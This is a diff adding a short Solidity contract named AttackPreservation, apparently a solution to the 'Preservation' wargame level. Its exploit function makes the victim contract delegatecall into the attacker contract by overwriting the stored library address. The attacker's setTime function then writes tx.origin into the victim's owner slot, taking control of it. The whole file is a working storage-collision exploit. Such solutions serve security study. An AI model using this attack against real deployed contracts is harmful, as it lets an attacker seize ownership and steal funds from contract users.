@@ -1,0 +1,30 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IPreservation {
+  function setFirstTime(uint _timeStamp) external;
+}
+
+contract AttackPreservation {
+
+  address public placeholder1;
+  address public placeholder2;
+  address public _newOwner; 
+  address private _victimContract;
+
+
+  constructor(address victimContract) {
+    _victimContract = victimContract;
+  }
+ 
+
+  function exploit() public {
+    IPreservation(_victimContract).setFirstTime(uint160(address(this)));
+    IPreservation(_victimContract).setFirstTime(0);
+  }
+
+  function setTime(uint256) public{
+    _newOwner = tx.origin;
+  }
+
+}
